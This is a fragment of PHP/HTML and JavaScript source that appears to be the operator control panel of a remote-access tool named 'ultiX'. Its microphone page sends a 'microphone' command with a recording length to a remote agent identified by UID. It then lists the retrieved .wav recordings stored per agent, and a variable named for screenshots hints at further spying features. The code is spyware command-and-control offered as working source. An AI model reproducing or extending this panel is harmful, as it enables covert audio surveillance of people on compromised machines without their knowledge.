                     ...
                     <div class="card">
                        <div class="card-body">
                           ...
                           <div class="list-group">
                              ...
                              <?php echo '<a href="#" class="list-group-item list-group-item-action px-3 border-0 ripple active"> <i class="bi bi-mic"></i> Microphone</a>'?>
                  ...
                  <div class="col">
                     <div class="row">
                        <div class="col">
                           <div class="card">
                              <div class="card-body">
                                 <h2> <i class="bi bi-mic"></i> Microphone</h2>
                                 <hr class="my-2">
                                 <h6> Seconds to record: </h6>
                                 <div class="form">
                                    <input class="form-control form-control-sm" type="text" placeholder="10" id="SecondsToRecord">
                                 </div>
                                 <hr class="my-2">
                                 <div id="alerts"> </div>
                                 <button onclick="sendMicrophone()" type="button" class="btn btn-primary"> Send Command  <i class="bi bi-arrow-up-right-circle-fill"></i> </button>
                                 
                              </div>
                           </div>
                           <div class="col">
                              <div class="screencapture-history">
                                 <div class="card">
                                    <div class="card-body">
                                       <h2> <i class="bi bi-mic"></i> Microphone - History</h2>
                                       <hr class="my-2">
                                       <table class="table data-table table-bordered table-hover" id="">
                                          ...
                                          <tbody>
                                             <?php
                                             $uid_screenshot_folder = "../../ultiX-Data/".$agent_UID."/mic";
                                             $mic = glob($uid_screenshot_folder."/*.wav");
                                             
                                             foreach($mic as $micfile) {
                                                $MicName = explode('mic/', $micfile);
                                                $fileName = explode('RandomStr', $micfile);
                                                $firstDateMic = str_replace(".wav", "", $MicName[1]);
                                                $datetime = substr($firstDateMic, 0, strpos($firstDateMic, "RandomStr"));
                                                echo "<tr>";
                                                echo '<td>'.$datetime.'</td>';
                                                echo '<td>'.'<a href="'.$micfile.'"'.'>'.$fileName[1].'</a>'.'</td>';
                                                echo "</tr>";
                                             }
                                          ?>
                                          </tbody>
...
function sendMicrophone() {
   ...
   var SecondsToRecord  = document.getElementById("SecondsToRecord").value;

   if (SecondsToRecord !== "" && SecondsToRecord >= 1 ) {
         var command = {
         "command": "microphone",
         "parameters": SecondsToRecord,
         "uid": UID,
      };
      ...
      alertMessageError(" ", "Invalid input, input must be larger as 1");
   }
